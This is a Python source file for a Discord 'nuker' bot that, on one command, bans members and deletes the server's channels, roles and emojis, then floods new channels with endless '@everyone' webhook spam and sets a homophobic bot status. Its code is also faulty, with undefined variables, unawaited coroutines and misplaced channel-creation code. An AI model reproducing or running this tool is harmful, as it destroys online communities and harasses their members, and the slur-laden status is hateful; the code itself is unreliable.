import discord, json, os, threading, asyncio
from discord.ext import commands

THREADS = 5

class c:
    """ Program Colors """
    r = u"\u001b[31m"
    g  = u"\u001b[32m"
    w  = u"\u001b[0m"

class Anti:
    """ Nukers are cringe I made this ages ago """
    def __init__(a2):
        a2.token  = input(f'[>] Please enter your Bot Token: ')
        a2.banned = []
        a2.roles  = []
        a2.emojis = []
        a2.channels = []

        a2.menuascii = f"""
    {c.r}   ╔═══════════════════════════════════════╗
                  {c.w} Nukers are Cringe {c.r}                      
    {c.r}   ╚═══════════════════════════════════════╝
       {c.r}╔══════════════════╗ {c.r}╔══════════════════╗
            {c.w}Commands             {c.w}Creators
         
       {c.r}  $w {c.w}| {c.r}$nk {c.w}| {c.r}$help  {c.r}    Chills {c.w}| {c.r}Doopy  
       {c.r}╚══════════════════╝ {c.r}╚══════════════════╝
       {c.r}╔═══════════════════════════════════════╗
                     {c.w}Command-Line
        """
        a2.banner = f'''
                                             {c.w}.-''-.{c.r}     
                  _..._           .--.     {c.w}.' .-.  ){c.r}    
                .'     '.         |__|    {c.w}/ .'  / /{c.r}     
              .   .-.   .     .|  .--.   {c.w}(_/   / /{c.r}      
        __    |  '   '  |   .' |_ |  |  {c.w}      / /{c.r}       
     .:--.'.  |  |   |  | .'     ||  |  {c.w}     / /{c.r}        
    / |   \ | |  |   |  |'--.  .-'|  |  {c.w}    . '{c.r}         
    `" __ | | |  |   |  |   |  |  |  |  {c.w}   / /    _.-'){c.r} 
     .'.''| | |  |   |  |   |  |  |__| {c.w}  .' '  _.'.-''{c.r}  
    / /   | |_|  |   |  |   |  '.'     {c.w} /  /.-'_.'{c.r}      
    \ \._,\ '/|  |   |  |   |   /     {c.w} /    _.'{c.r}         
      `--'  `" '--'   '--'   `'-'      {c.w}( _.-'                                  
                  github.com/{c.r}codeuk{c.w}
        '''

        a2.ASCII()
        a2.antinet = commands.Bot(command_prefix='$', intents = discord.Intents.all())

    def ASCII(a2):
        os.system('cls')	
        os.system('title ┼ ANTI V2 ┼')
        print(a2.banner)

    @staticmethod
    def Log(i, msg, worked=True):
        logc = c.g if worked else c.r
        print(f'{" "*15}{c.w}[{logc}{i}{c.w}] {msg}')

    @staticmethod
    def StartThreads(func, m, c, r, e) -> None:
        for i in range(THREADS):
            thread = threading.Thread(target=func, args=(m, c, r, e))
            thread.start()

    async def Ban(a2, member):
        a2.banned.append(member)
        try:
            await member.ban(reason='lol')
            a2.Log(i, "Member Banned")
        except: a2.Log(i, "Member Not Banned", worked=False)

    async def Channels(a2, channel):
        a2.channels.append(channel)
        try:
            await channel.delete()
            a2.Log(i, "Channel Deleted")
        except: a2.Log(i, "Channel Not Deleted", worked=False)

    async def Roles(a2, role):
        a2.roles.append(role)
        try:
            await role.delete()
            a2.Log(i, "Role Deleted")
        except: a2.Log(i, "Role Not Deleted", worked=False)

    async def Emojis(a2, emoji):
        a2.emojis.append(emoji)
        try:
            await emoji.delete()
            a2.Log(i, "Emoji Deleted")
        except: a2.Log(i, "Emoji Not Deleted", worked=False)

        for i in range(100):
            await ctx.guild.create_text_channel("github com wnfo")
            print(f'               {c.w}[{c.g}+{c.w}] Created Channel')

    def Nuke(a2, members, channels, roles, emojis) -> None:
        for i, member in enumerate(members):
            if member in a2.banned: continue
            else: a2.Ban(member)

        for i, channel in enumerate(channels):
            if channel in a2.channels: continue
            else: a2.Channels(channel)

        for i, role in enumerate(roles):
            if role in a2.roles: continue
            else: a2.Roles(role)

        for i, emoji in enumerate(emojis):
            if emoji in a2.emojis: continue
            else: a2.Emojis(emoji)

    def Main(a2) -> None:
        @a2.antinet.event
        async def on_ready():
            await a2.antinet.change_presence(status=discord.Status.idle, activity=discord.Game('AntiGays'))
            print(a2.menuascii)

        a2.antinet.remove_command('help')

        @a2.antinet.command()
        async def w(ctx, *, message):
            print(f'             {c.w}[{c.r}${c.w}] Command Used: $w ')
            print(f'               {c.w}[{c.g}+{c.w}] Watching Text: {message}\n')
            await ctx.message.delete()
            await a2.antinet.change_presence(activity=discord.Activity(
                type=discord.ActivityType.watching,
                name=message
            ))

        @a2.antinet.command()
        async def clear(ctx):
            os.system('cls')
            print(a2.menuascii)
            print(f'             {c.w}[{c.r}${c.w}] Command Used: $clear')

        @a2.antinet.command(aliases=['nuke', 'n'])
        async def nk(ctx):
            await ctx.message.delete()
            print(f'             {c.w}[{c.r}${c.w}] Command Used: $n')
            a2.StartThreads(
              a2.Nuke,
              ctx.guild.members,
              ctx.guild.channels,
              ctx.guild.roles,
              ctx.guild.emojis
            )

        @a2.antinet.event
        async def on_guild_channel_create(channel):
            web = await channel.create_webhook(name="AntiV2 Nuker")
            while True:
                await web.send('@everyone @here AntiV2 - github.com/wnfo')
                await channel.send('@everyone @here AntiV2 - github.com/wnfo')

        a2.antinet.run(a2.token)

CringeNuker = Anti()
CringeNuker.Main()
